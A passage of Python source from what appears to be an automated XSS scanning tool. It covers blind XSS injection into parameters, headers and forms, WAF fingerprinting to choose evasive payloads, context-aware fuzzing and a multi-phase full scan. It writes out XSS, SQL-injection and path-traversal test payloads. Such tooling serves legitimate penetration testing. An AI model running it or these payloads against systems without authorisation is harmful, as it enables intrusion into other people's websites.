            params = {'q': ['test'], 'id': ['1'], 'name': ['test']}

        # Inject into each parameter
        for param_name in params:
            for payload in blind_payloads:
                resp, reflected, ref_type = self._inject_and_check(url, param_name, payload)
                results['details']['payloads_injected'].append({
                    'param': param_name,
                    'payload': payload[:80],
                    'reflected': reflected,
                    'status': resp.status_code if resp else 'error',
                })

        # Also inject into HTTP headers
        header_injection_points = [
            'X-Forwarded-For', 'X-Original-URL', 'Referer', 'User-Agent',
            'X-Custom-Header', 'Cookie', 'Accept-Language', 'Origin',
        ]
        for header in header_injection_points:
            for payload in blind_payloads[:3]:  # Top 3 only for headers
                try:
                    headers = {header: payload}
                    resp = self._send_request(url, headers=headers)
                    results['details']['injection_points'].append({
                        'type': 'header',
                        'header': header,
                        'payload': payload[:80],
                        'status': resp.status_code if resp else 'error',
                    })
                except Exception:
                    pass

        # Inject into form fields if we have crawled forms
        for form in self.crawled_forms:
            for inp in form.get('inputs', []):
                name = inp.get('name', '')
                if name and name not in ['submit', 'button', 'csrf', '_token']:
                    for payload in blind_payloads[:3]:
                        results['details']['injection_points'].append({
                            'type': 'form',
                            'action': form.get('action', ''),
                            'field': name,
                            'payload': payload[:80],
                        })

        self._log(f"Blind XSS: {len(results['details']['payloads_injected'])} payloads injected, "
                  f"{len(results['details']['injection_points'])} injection points", "info")
        return results

    # ========================================================================
    # METHOD: detect_waf
    # ========================================================================

    def detect_waf(self, url):
        """
        Detect WAF type.
        Returns dict with WAF detection results.
        """
        if not url.startswith('http'):
            url = f"https://{url}"
        self._log(f"Detecting WAF on {url}", "info")
        results = {
            'vulnerable': False,
            'findings': [],
            'details': {
                'waf_detected': None,
                'waf_evidence': [],
                'confidence': 0,
            },
            'scan_type': 'waf_detection',
        }

        # Test with XSS payloads and check for WAF responses
        test_payloads = [
            '<script>alert(1)</script>',
            "' OR 1=1-- -",
            '../../../etc/passwd',
            '<img src=x onerror=alert(1)>',
        ]

        evidence_count = 0
        for payload in test_payloads:
            encoded = urllib.parse.quote(payload, safe='')
            sep = "&" if "?" in url else "?"
            test_url = f"{url}{sep}q={encoded}"
            resp = self._send_request(test_url)

            if not resp:
                continue

            # Check status codes
            if resp.status_code in [403, 406, 429, 501]:
                evidence_count += 1
                results['details']['waf_evidence'].append(
                    f"Blocked status {resp.status_code} for payload"
                )

            # Check WAF headers
            waf_header_map = {
                'cf-ray': 'Cloudflare',
                'x-akamai-transformed': 'Akamai',
                'x-sucuri-id': 'Sucuri',
                'x-iinfo': 'Imperva/Incapsula',
                'x-amzn-requestid': 'AWS WAF',
                'x-protected-by': 'Sqreen',
                'x-denied-reason': 'Wordfence',
            }
            for header, waf_name in waf_header_map.items():
                if header in resp.headers:
                    evidence_count += 2
                    results['details']['waf_evidence'].append(
                        f"WAF header: {header}={resp.headers[header][:50]}"
                    )
                    results['details']['waf_detected'] = waf_name
                    self.waf_type = waf_name

            # Check WAF body signatures
            waf_body_map = {
                'Cloudflare': ['cloudflare', 'cf-browser-verification', 'Attention Required'],
                'AWS WAF': ['AWS WAF', 'Request blocked'],
                'Akamai': ['Access Denied', 'akamai'],
                'Sucuri': ['Sucuri', 'sucuri.net'],
                'Imperva/Incapsula': ['Incapsula', 'Incapsula incident'],
                'ModSecurity': ['ModSecurity', 'Not Acceptable'],
                'F5 BIG-IP': ['BIG-IP', 'F5'],
                'Wordfence': ['wordfence', 'WF'],
            }
            for waf_name, sigs in waf_body_map.items():
                for sig in sigs:
                    if sig.lower() in resp.text[:5000].lower():
                        evidence_count += 2
                        results['details']['waf_evidence'].append(
                            f"Body signature: {sig}"
                        )
                        results['details']['waf_detected'] = waf_name
                        self.waf_type = waf_name

        # Also check a normal request for WAF headers
        resp = self._send_request(url)
        if resp:
            for header, waf_name in waf_header_map.items():
                if header in resp.headers and not results['details']['waf_detected']:
                    results['details']['waf_detected'] = waf_name
                    self.waf_type = waf_name

        if evidence_count > 0:
            results['vulnerable'] = True  # WAF presence is a "finding"
            results['details']['confidence'] = min(evidence_count * 25, 100)
            results['findings'].append({
                'type': 'waf_detection',
                'waf': results['details']['waf_detected'],
                'confidence': results['details']['confidence'],
            })
            self._log(f"WAF detected: {results['details']['waf_detected']} "
                     f"(confidence: {results['details']['confidence']}%)", "success")
        else:
            self._log("No WAF detected", "info")

        return results

    def _identify_waf_from_response(self, resp):
        """Identify WAF from a single response"""
        if not resp:
            return None

        # Check headers
        waf_header_map = {
            'cf-ray': 'Cloudflare',
            'x-akamai-transformed': 'Akamai',
            'x-sucuri-id': 'Sucuri',
            'x-iinfo': 'Imperva/Incapsula',
            'x-amzn-requestid': 'AWS WAF',
        }
        for header, waf_name in waf_header_map.items():
            if header in resp.headers:
                return waf_name

        # Check body
        waf_body_map = {
            'Cloudflare': ['cloudflare', 'Attention Required'],
            'AWS WAF': ['AWS WAF'],
            'Sucuri': ['Sucuri'],
            'Imperva/Incapsula': ['Incapsula'],
            'ModSecurity': ['ModSecurity'],
        }
        for waf_name, sigs in waf_body_map.items():
            for sig in sigs:
                if sig.lower() in resp.text[:3000].lower():
                    return waf_name

        return "Generic"

    # ========================================================================
    # METHOD: run (Main Entry Point)
    # ========================================================================

    def run(self, target, scan_type='full', **kwargs):
        """
        Main entry point for XSStrike Enhancement Engine.

        scan_type options:
          - 'reflected': Reflected XSS testing
          - 'dom': DOM XSS testing
          - 'blind': Blind XSS testing
          - 'context_aware': Context-aware fuzzing
          - 'full': Complete scan (all techniques)
        """
        url = target if target.startswith('http') else f"https://{target}"
        param = kwargs.get('param', 'q')

        self._log(f"{'='*60}", "info")
        self._log(f"XSStrike Enhancement Engine - {scan_type.upper()} scan", "info")
        self._log(f"Target: {url} | Param: {param}", "info")
        self._log(f"{'='*60}", "info")

        scan_map = {
            'reflected': lambda: self.test_reflected(url, param),
            'dom': lambda: self.test_dom(url),
            'blind': lambda: self.test_blind(url, kwargs.get('callback_url')),
            'context_aware': lambda: self._context_aware_fuzz(url, param),
            'full': lambda: self._full_scan(url, param),
            'crawl': lambda: self.crawl(url),
        }

        handler = scan_map.get(scan_type)
        if handler:
            return handler()
        else:
            return {'error': f'Unknown scan type: {scan_type}'}

    def _context_aware_fuzz(self, url, param):
        """
        Context-aware fuzzing - determine context then generate targeted payloads.
        Returns dict with context-aware fuzzing results.
        """
        self._log(f"Context-aware fuzzing on {url} param={param}", "info")
        results = {
            'vulnerable': False,
            'findings': [],
            'details': {
                'injection_context': CONTEXT_UNKNOWN,
                'payloads_generated': 0,
                'payloads_tested': 0,
                'reflections': [],
                'confirmed_xss': [],
            },
            'scan_type': 'context_aware_fuzz',
        }

        # Step 1: Detect WAF first
        waf_result = self.detect_waf(url)
        waf_type = waf_result.get('details', {}).get('waf_detected')
        if waf_type:
            self.waf_type = waf_type
            results['details']['waf_type'] = waf_type

        # Step 2: Test reflection with marker
        marker_payload = f"{self._marker}fuzz{random.randint(1000,9999)}"
        resp, reflected, ref_type = self._inject_and_check(url, param, marker_payload)

        if not reflected:
            # Try alternative injection methods
            for method in ['POST', 'GET']:
                for alt_param in [param, 'q', 'search', 'id']:
                    resp, reflected, ref_type = self._inject_and_check(url, alt_param, marker_payload, method=method)
                    if reflected:
                        param = alt_param
                        break
                if reflected:
                    break

        if not reflected:
            self._log("Parameter not reflected - cannot fuzz", "warning")
            return results

        # Step 3: Detect context
        context = CONTEXT_UNKNOWN
        if resp:
            context = self.detect_context(resp.text, self._marker)
        results['details']['injection_context'] = context

        # Step 4: Generate context-aware payloads
        payloads = self.generate_payloads(context, waf_type)
        results['details']['payloads_generated'] = len(payloads)

        # Step 5: Fuzz with all payloads
        tested = 0
        for payload in payloads:
            tested += 1
            resp, reflected, ref_type = self._inject_and_check(url, param, payload)

            if reflected:
                reflection_info = {
                    'payload': payload[:100],
                    'reflection_type': ref_type,
                    'context': context,
                    'executable': False,
                }

                if resp:
                    reflection_info['executable'] = self._is_executable(payload, resp.text)

                results['details']['reflections'].append(reflection_info)

                if reflection_info['executable']:
                    results['vulnerable'] = True
                    results['details']['confirmed_xss'].append(reflection_info)
                    results['findings'].append({
                        'type': 'context_aware_xss',
                        'payload': payload[:100],
                        'param': param,
                        'context': context,
                        'executable': True,
                    })
                    self._log(f"CONFIRMED XSS in {context}: {payload[:60]}", "success")

        results['details']['payloads_tested'] = tested
        self._log(f"Context-aware fuzzing: {tested} payloads, "
                  f"{len(results['details']['reflections'])} reflections, "
                  f"{len(results['details']['confirmed_xss'])} confirmed", "info")
        return results

    def _full_scan(self, url, param):
        """Run complete XSS scan with all techniques"""
        full_results = {
            'vulnerable': False,
            'findings': [],
            'details': {},
            'scan_type': 'full_xss',
        }

        # Phase 1: Crawl
        self._log("\n[Phase 1/6] Crawling target", "info")
        crawl = self.crawl(url)
        full_results['details']['crawl'] = crawl
        full_results['findings'].extend(crawl.get('findings', []))

        # Phase 2: Detect WAF
        self._log("\n[Phase 2/6] WAF Detection", "info")
        waf = self.detect_waf(url)
        full_results['details']['waf'] = waf
        full_results['findings'].extend(waf.get('findings', []))

        # Phase 3: Parameter Mining
        self._log("\n[Phase 3/6] Parameter Mining", "info")
        mining = self.mine_parameters(url)
        full_results['details']['parameter_mining'] = mining
        full_results['findings'].extend(mining.get('findings', []))

        # Phase 4: Reflected XSS
        self._log("\n[Phase 4/6] Reflected XSS Testing", "info")
        reflected = self.test_reflected(url, param)
        full_results['details']['reflected'] = reflected
        full_results['findings'].extend(reflected.get('findings', []))
        if reflected.get('vulnerable'):
            full_results['vulnerable'] = True

        # Also test any reflected params found during mining
        reflected_params = mining.get('details', {}).get('reflected_params', [])
        for rp in reflected_params[:5]:
            rp_name = rp.get('parameter', '')
            if rp_name and rp_name != param:
                self._log(f"Testing reflected param: {rp_name}", "info")
                rp_result = self.test_reflected(url, rp_name)
                if rp_result.get('vulnerable'):
                    full_results['vulnerable'] = True
                    full_results['findings'].extend(rp_result.get('findings', []))

        # Phase 5: DOM XSS
        self._log("\n[Phase 5/6] DOM XSS Testing", "info")
        dom = self.test_dom(url)
        full_results['details']['dom'] = dom
        full_results['findings'].extend(dom.get('findings', []))
        if dom.get('vulnerable'):
            full_results['vulnerable'] = True

        # Phase 6: Blind XSS
        self._log("\n[Phase 6/6] Blind XSS Testing", "info")
        blind = self.test_blind(url, self.callback_url)
        full_results['details']['blind'] = blind
        full_results['findings'].extend(blind.get('findings', []))

        self._log(f"\n{'='*60}", "info")
        if full_results['vulnerable']:
            self._log("TARGET IS VULNERABLE TO XSS!", "critical")
        else:
            self._log("Target does not appear vulnerable to XSS", "info")
        self._log(f"{'='*60}", "info")

        return full_results


# ============================================================================
# MODULE-LEVEL RUN FUNCTION
# ============================================================================

def run(target, scan_type='full', **kwargs):
    """Module-level entry point for ZYLON integration"""
    engine = XSStrikeEngine(
        timeout=kwargs.get('timeout', 10),
        retries=kwargs.get('retries', 3),
        threads=kwargs.get('threads', 5),
        verbose=kwargs.get('verbose', True),
        proxy=kwargs.get('proxy', None),
        callback_url=kwargs.get('callback_url', None),
    )
    return engine.run(target, scan_type, **kwargs)
